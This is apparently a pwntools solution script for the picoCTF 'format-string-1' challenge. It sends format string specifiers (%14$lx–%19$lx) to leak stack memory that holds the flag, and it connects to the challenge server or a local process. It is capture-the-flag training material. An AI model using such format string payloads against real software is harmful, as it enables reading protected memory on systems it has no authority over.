#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./format-string-1"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("mimas.picoctf.net", 55665)
elif len(argv) >= 2 and argv[1] == "d":
    cmd = """
    	b *0x0000000000401327
    	c
    """
    p = gdb.debug(chall,cmd)
else:
    p = process(chall)

payload = b"%19$lx"
payload += b"%18$lx"
payload += b"%17$lx"
payload += b"%16$lx"
payload += b"%15$lx"
payload += b"%14$lx"

p.sendlineafter(b':', payload)

print("visit: https://cyberchef.org/#recipe=From_Hex('Auto')Reverse('Character')")

p.interactive()
